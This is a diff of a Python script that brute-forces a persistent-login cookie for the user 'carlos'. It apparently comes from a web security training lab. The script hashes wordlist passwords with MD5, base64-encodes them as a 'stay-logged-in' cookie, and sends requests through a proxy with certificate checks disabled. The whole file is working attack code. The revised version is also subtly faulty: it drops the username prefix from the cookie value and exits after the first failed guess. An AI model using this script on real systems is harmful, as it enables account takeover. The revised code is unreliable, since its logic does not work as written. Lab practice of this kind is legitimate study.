@@ -1,39 +1,42 @@
 import requests
-import urllib3
-import sys
 import hashlib
+import sys
 import base64
-
+import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
 
-def access_carlos_account(s,url):
-    print("#######Accessing into the carlos account#############")
-    
+def access_carlos_page(s,url):
+    print("######### Accessing the carlos page##############")
+    # open the password file hai.
     with open('lab_10_password.txt','r') as file:
-        # password lai file ma kholya
         password=file.readlines()
-        for passwords in password:
-            #print(passwords.strip())
-            #what I need here is: send a get request hai 
-            md5_password='carlos:'+hashlib.md5(passwords.strip().encode("utf-8")).hexdigest()
-            base64_password=base64.b64encode(bytes(md5_password,"utf-8"))
-            str_passwd=base64_password.decode("utf-8")
-            print(str_passwd.rstrip('='))
-            my_account=url + '/my-account?id=carlos'
-            cookies={'stay-logged-in':str_passwd}
-            # send a get request
-            r=requests.get(my_account,cookies=cookies,proxies=proxies,verify=False)
-            if "Log out" in r.text:
-                print("Successfully loggged into carlos account")
-                sys.exit(0)
-            else:
-                print("Failed to logged in into carlos account")
-        print("[-]All passwords tried no valid passwords found")        
-                         
+        for i in password:
+            # now I do get a password what I do it hash into md5 and encode it
+            i=i.strip()
+            md5_hash_passwd=hashlib.md5(i.encode("utf-8")).hexdigest()
+            #print(md5_hash_passwd)
+            # now I need to change this passsword into base64
+            base64_passwd=base64.b64encode(bytes(md5_hash_passwd,"utf-8"))
+            str_passwd=base64_passwd.decode('utf-8')
+            print(str_passwd.rstrip("="))
             
-        
-
+            
+            # now we need to use it hai ta
+            my_account=url+'my-account?id=carlos'
+            cookies={'stay-logged-in':str_passwd}
+            # make a get request
+            r=requests.get(my_account,cookies=cookies,verify=False,proxies=proxies)
+            res=r.text
+            if "Log out" in res:
+                print("Successfully found the carlos page", str_passwd)
+                exit(0)
+            else:
+                print("Failed to found carlos page")
+                sys.exit(-1)
+                    
+            
 
 
 def main():
@@ -43,8 +46,8 @@ def main():
     else:
         s=requests.Session()
         url=sys.argv[1]
-        access_carlos_account(s,url)    
-
+        print(f"The url is: {url}") 
+        access_carlos_page(s,url) 
 
 if __name__=="__main__":
     main()
